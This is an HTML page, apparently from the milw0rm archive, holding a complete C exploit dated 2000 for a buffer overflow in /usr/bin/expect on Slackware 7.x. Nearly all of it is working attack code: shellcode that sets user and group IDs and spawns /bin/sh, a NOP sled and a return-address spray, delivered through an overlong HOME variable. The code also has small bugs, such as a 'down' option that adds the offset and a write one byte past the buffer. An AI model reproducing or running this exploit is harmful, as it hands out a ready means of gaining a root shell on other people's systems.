<html>
<head>
<title>expect (/usr/bin/expect) buffer overflow</title>
<pre>
/* hhp-expect_smash.c (12/11/00)
 *
 * expect (/usr/bin/expect) buffer overflow.
 * Tested 5.31.8 and 5.28.1, slackware 7.x (Maybe others).
 *
 * By: isox
 * Site: www.hhp-programming.net
 * Advisory: www.hhp-programming.net/ouradvisories/hhp-expect_adv%2317.txt
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define NOP				0x90
#define OFFSET			0
#define BUFLEN			416
#define RET				0xbffff580			/* Slackware 7.1 */
#define EXPECT			&quot;/usr/bin/expect&quot;

char code[] =
 &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x66\x31\xc0\x66\x31&quot;
 &quot;\xdb\xb0\x2e\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0&quot;
 &quot;\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08&quot;
 &quot;\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8&quot;
 &quot;\xdc\xff\xff\xff/bin/sh\x69&quot;;

void usage(char *arg) {
  fprintf(stderr, &quot;\nUsage: %s [offset up/down] [eip]\n\n&quot;, arg);
  fprintf(stderr, &quot;Examples:\n&quot;);
  fprintf(stderr, &quot;\t%s 347 up                 -=- Default EIP increased by 347 bytes\n&quot;, arg);
  fprintf(stderr, &quot;\t%s 347 down               -=- Default EIP decreased by 347 bytes\n&quot;, arg);
  fprintf(stderr, &quot;\t%s 429 up 0x%lx      -=- EIP set to 0x%lx and increased by 429 bytes\n&quot;, arg, RET, RET + 429);
  fprintf(stderr, &quot;\t%s 429 down 0x%lx    -=- EIP set to 0x%lx and decreased by 429 bytes\n\n&quot;, arg, RET, RET - 429);
  exit(1);
}


int main(int argc, char *argv[]) {
  char *buf, *p;
  long *addressp, address;
  int offset=OFFSET;
  int i;


  if((argc &lt; 3) || (argc &gt; 4))
    usage(argv[0]);

  if(argc == 3) {
    if(!strcmp(argv[2], &quot;up&quot;)) {
      address = RET + atoi(argv[1]);
      printf(&quot;Increasing offset by: %d\n&quot;, atoi(argv[1]));
      printf(&quot;Increasing EIP to: 0x%x\n\n&quot;, RET + atoi(argv[1]));
    }

    if(!strcmp(argv[2], &quot;down&quot;)) {
      address = RET - atoi(argv[1]);
      printf(&quot;Decreasing offset by: %d\n&quot;, atoi(argv[1]));
      printf(&quot;Decreasing EIP to: 0x%x\n\n&quot;, RET - atoi(argv[1]));
    }
  }

  if(argc &gt;= 4) {
    if(!strcmp(argv[2], &quot;up&quot;)) {
      address = strtoul(argv[3], NULL, 16) + atoi(argv[1]);
      printf(&quot;Setting EIP to: 0x%x\n&quot;, strtoul(argv[3], NULL, 16));
      printf(&quot;Increasing offset by: %d\n&quot;, atoi(argv[1]));
      printf(&quot;Increasing EIP to: 0x%x\n\n&quot;, (strtoul(argv[3], NULL, 16) + atoi(argv[1])));
    }
    if(!strcmp(argv[2], &quot;down&quot;)) {
      address = strtoul(argv[3], NULL, 16) + atoi(argv[1]);
      printf(&quot;Setting EIP to: 0x%x\n&quot;, strtoul(argv[3], NULL, 16));
      printf(&quot;Decreasing offset by: %d\n&quot;, atoi(argv[1]));
      printf(&quot;Decreasing EIP to: 0x%x\n\n&quot;, (strtoul(argv[3], NULL, 16) - atoi(argv[1])));
    }
  }


  if (!(buf = (char *)malloc(BUFLEN))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(-1);
  }

  p = buf;
  addressp = (long *) p;

  for (i = 0; i &lt; BUFLEN; i+=4) {
    *(addressp++) = address;
  }

  for (i = 0; i &lt; (BUFLEN - strlen(code) - 4); i++) {
    buf[i] = NOP;
  }

  p = buf + (BUFLEN - strlen(code) - 4);

  for (i = 0; i &lt; strlen(code); i++)
    *(p++) = code[i];

  buf[BUFLEN] = '\0';


  setenv(&quot;HOME&quot;, buf, 1);
  system(EXPECT);
}
</pre>
// milw0rm.com [2000-12-04]
</html>

